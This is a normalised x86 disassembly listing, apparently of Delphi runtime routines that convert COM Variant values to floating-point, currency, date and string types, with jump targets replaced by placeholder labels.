lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411378
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411394 ]
mov eax ebx
call sub_4111b8
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_4111b8
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411378
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41127c
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_4112c8
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_40e990
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_41132c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_41127c
fstp [ esp ]
fwait
mov eax ebx
call sub_41127c
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411571 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_4111b8
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411378
fstp [ esp ]
fwait
jmp r-xdata
sub_411710
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_411875
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_411378
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_411732 ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_40e990
sub_4118a0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41197c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412e2c
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4041f4
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40afbc
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411983
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0xc ]
call sub_404678
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_4041f4
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_40973c
test al al
je r-xdata
mov dx [ ebx ]
mov cx 0x7
call sub_40edd0
jmp r-xdata
mov dx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_40edd0
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_41198c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40edd0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4119ec
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40edd0
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_411a38
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411a8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f49c
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411ae8
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411a94
lea eax [ ebp - 0x18 ]
call sub_40f174
retn
sub_411a9c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415800
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411ae8
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411b04 ]
mov eax ebx
call sub_4118a0
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4119ec
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_4118a0
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_41198c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411ae8
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4119ec
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411a38
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_40e990
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411a9c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_4119ec
fstp [ esp ]
fwait
mov eax ebx
call sub_4119ec
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411ccf ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4119ec
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_4118a0
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_41198c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411ae8
fstp [ esp ]
fwait
jmp r-xdata
sub_411e38
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411ee4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412e2c
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4041f4
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_409794
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411eeb
lea eax [ ebp - 0x10 ]
call sub_403f6c
lea eax [ ebp - 0xc ]
call sub_404678
retn
mov dx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_40edd0
jmp r-xdata
mov dx [ ebx ]
mov cx 0x6
call sub_40edd0
jmp r-xdata
sub_411ef4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40edd0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411f54
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40edd0
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_411fa0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411ff5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f49c
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_412050
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411ffc
lea eax [ ebp - 0x18 ]
call sub_40f174
retn
sub_412004
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415800
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_412050
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41206c ]
mov eax ebx
call sub_411e38
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411f54
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411f54
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411e38
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411ef4
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_412050
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411f54
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411fa0
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_40e990
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_412004
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411f54
fistp [ esp ]
fwait
mov eax ebx
call sub_411f54
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_412271 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411f54
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411f54
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411e38
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411ef4
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_412050
fistp [ esp ]
fwait
jmp r-xdata
sub_41241c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404678
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40edd0
pop ebx
pop ebp
retn 0x8
sub_412454
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404678
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40edd0
pop ebx
pop ebp
retn 0x8
sub_41248c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412542
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404678
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40edd0
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412549
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f90
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_4041f4
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407f2c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4047c4
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_4041f4
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407ef0
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4047c4
jmp r-xdata
jmp r-xdata
call sub_40ea2c
sub_412550
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41260f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4125ed
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40edd0
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404788
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404874
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4041f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4125f4
lea eax [ ebp - 0x10 ]
call sub_40f174
retn
sub_41261c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412672
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f49c
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412704
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412679
lea eax [ ebp - 0x10 ]
call sub_40f174
retn
sub_412680
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_415800
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4126f5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f174
retn
sub_412704
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412c3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41273d ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403fc0
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403f6c
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408240
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403fc0
jmp r-xdata
